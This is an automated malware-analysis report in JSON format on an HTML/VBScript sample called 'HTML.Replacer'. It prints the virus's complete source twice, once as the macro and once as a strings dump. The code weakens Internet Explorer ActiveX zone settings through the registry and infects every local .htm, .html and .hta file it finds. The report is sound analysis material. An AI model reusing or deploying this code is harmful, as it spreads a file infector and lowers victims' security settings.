{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": "<HTML>\n<HEAD>\n<META NAME=\"GENERATOR\" Content=\"SAPIEN Technologies PrimalSCRIPT(TM)\">\n<TITLE>HTML.Replace Was Here</TITLE>\n</HEAD>\n<BODY>\n\n<SCRIPT Language=\"VBScript\" id=\"HTML.Replacer\">\nConst ForReading = 1, ForWriting = 2, ForAppending = 8\n\noRange = document.Scripts.NamedItem(\"HTML.Replacer\").Text\nSet WshShell = CreateObject(\"WScript.Shell\")\nif location.Port = \"\" Then\n    WshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"\n    WshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"\n    thisFile = location.pathname\n    theLength = Len(thisFile)\n    thisFileTxt = thisFile\n    Do Until thePosition = 1\n        thePosition = InStr(thisFileTxt, \"\\\")\n        thePosition = thePosition + 1\n        thisFileTxt = Mid(thisFileTxt, thePosition, theLength)\n    Loop\n    theLength2 = Len(thisFileTxt)\n    theLength = theLength - theLength2\n    thisFile = Mid(thisFile, 2, theLength - 1)\n    \n    theFolder (thisFile)\nElse\n    \nEnd If\n\nSub theFolder(theName)\nOn Error Resume Next\n\nSet Fso = CreateObject(\"Scripting.FileSystemObject\")\nIf Fso.FolderExists(theName) Then\nSet FolderObj = Fso.GetFolder(theName)\n    Set FO = FolderObj.Files\n        For Each NewFile In FO\n            ExtName = LCase(Fso.GetExtensionName(NewFile.Name))\n            Select Case ExtName\n                Case \"hta\", \"html\", \"htm\"\n                    Set MyFile = Fso.GetFile(NewFile.Path)\n                    Set kamb = Fso.OpenTextFile(MyFile, ForReading)\n                    metafind = 0\n                    Do Until kamb.AtEndOfStream\n                        If metafind = 0 Then\n                            strg = kamb.ReadLine\n                            metafind = InStr(1, strg, \"HTML.Replace Was Here\", vbTextCompare)\n                            boo = 1\n                        Else\n                            boo = 2\n                            Exit Do\n                        End If\n                    Loop\n                    If boo = 1 Then\n                        kamb.Close\n                        getItAll(MyFile)\n\t\t\t\t\telse\n\t\t\t\t\t\tkamb.Close\n                    End If\n                Case Else\n            End Select\n        Next\nElse\n    Exit Sub\nEnd If\nEnd Sub\n\nFunction getItAll(theFile)\nOn Error Resume Next\n\nSet Fso = CreateObject(\"Scripting.FileSystemObject\")\nSet ts = Fso.OpenTextFile(theFile, ForReading)\nstrg = ts.ReadAll\nmetafind = InStr(1, strg, \"TITLE\", vbTextCompare)\nnextFind = InStr(metafind, strg, VbCrlf)\ntogetHer = nextFind - metafind\nstrTitle = Mid(strg, metafind, togetHer)\nnewTitle = \"title>HTML.Replace Was Here</title>\"\nstrReplace = Replace(strg, strTitle, newTitle, vbTextCompare)\nts.Close\n\nSet ts = Fso.OpenTextFile(theFile, ForWriting)\nts.write strReplace\nts.WriteBlankLines(1) \nts.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"HTML.Replacer\"\">\"\nts.Write oRange\nts.Write \"<\" & \"/\" & \"script>\"\nts.Close\nEnd Function\n</script>\n\n</BODY>\n</HTML>"
    },
    "filename": "VirusShare_31ccacfc1ef613c0afbb9c867e3389d9",
    "filesize": 3083,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "31ccacfc1ef613c0afbb9c867e3389d9",
        "sha1": "a1d929ac4131db79dc21e5bd7f7131c8bcc2a8a9",
        "sha256": "7fcb2144629f7ad0d7566fdb1c57ce814db2f9832e01674fe3b86e84c3ab3453"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<HTML>",
            "<HEAD>",
            "<META NAME=\"GENERATOR\" Content=\"SAPIEN Technologies PrimalSCRIPT(TM)\">",
            "<TITLE>HTML.Replace Was Here</TITLE>",
            "</HEAD>",
            "<BODY>",
            "<SCRIPT Language=\"VBScript\" id=\"HTML.Replacer\">",
            "Const ForReading = 1, ForWriting = 2, ForAppending = 8",
            "oRange = document.Scripts.NamedItem(\"HTML.Replacer\").Text",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "if location.Port = \"\" Then",
            "    WshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"",
            "    WshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"",
            "    thisFile = location.pathname",
            "    theLength = Len(thisFile)",
            "    thisFileTxt = thisFile",
            "    Do Until thePosition = 1",
            "        thePosition = InStr(thisFileTxt, \"\\\")",
            "        thePosition = thePosition + 1",
            "        thisFileTxt = Mid(thisFileTxt, thePosition, theLength)",
            "    Loop",
            "    theLength2 = Len(thisFileTxt)",
            "    theLength = theLength - theLength2",
            "    thisFile = Mid(thisFile, 2, theLength - 1)",
            "    ",
            "    theFolder (thisFile)",
            "Else",
            "    ",
            "End If",
            "Sub theFolder(theName)",
            "On Error Resume Next",
            "Set Fso = CreateObject(\"Scripting.FileSystemObject\")",
            "If Fso.FolderExists(theName) Then",
            "Set FolderObj = Fso.GetFolder(theName)",
            "    Set FO = FolderObj.Files",
            "        For Each NewFile In FO",
            "            ExtName = LCase(Fso.GetExtensionName(NewFile.Name))",
            "            Select Case ExtName",
            "                Case \"hta\", \"html\", \"htm\"",
            "                    Set MyFile = Fso.GetFile(NewFile.Path)",
            "                    Set kamb = Fso.OpenTextFile(MyFile, ForReading)",
            "                    metafind = 0",
            "                    Do Until kamb.AtEndOfStream",
            "                        If metafind = 0 Then",
            "                            strg = kamb.ReadLine",
            "                            metafind = InStr(1, strg, \"HTML.Replace Was Here\", vbTextCompare)",
            "                            boo = 1",
            "                        Else",
            "                            boo = 2",
            "                            Exit Do",
            "                        End If",
            "                    Loop",
            "                    If boo = 1 Then",
            "                        kamb.Close",
            "                        getItAll(MyFile)",
            "\t\t\t\t\telse",
            "\t\t\t\t\t\tkamb.Close",
            "                    End If",
            "                Case Else",
            "            End Select",
            "        Next",
            "Else",
            "    Exit Sub",
            "End If",
            "End Sub",
            "Function getItAll(theFile)",
            "On Error Resume Next",
            "Set Fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set ts = Fso.OpenTextFile(theFile, ForReading)",
            "strg = ts.ReadAll",
            "metafind = InStr(1, strg, \"TITLE\", vbTextCompare)",
            "nextFind = InStr(metafind, strg, VbCrlf)",
            "togetHer = nextFind - metafind",
            "strTitle = Mid(strg, metafind, togetHer)",
            "newTitle = \"title>HTML.Replace Was Here</title>\"",
            "strReplace = Replace(strg, strTitle, newTitle, vbTextCompare)",
            "ts.Close",
            "Set ts = Fso.OpenTextFile(theFile, ForWriting)",
            "ts.write strReplace",
            "ts.WriteBlankLines(1) ",
            "ts.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"HTML.Replacer\"\">\"",
            "ts.Write oRange",
            "ts.Write \"<\" & \"/\" & \"script>\"",
            "ts.Close",
            "End Function",
            "</script>",
            "</BODY>",
            "</HTML>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.275355",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
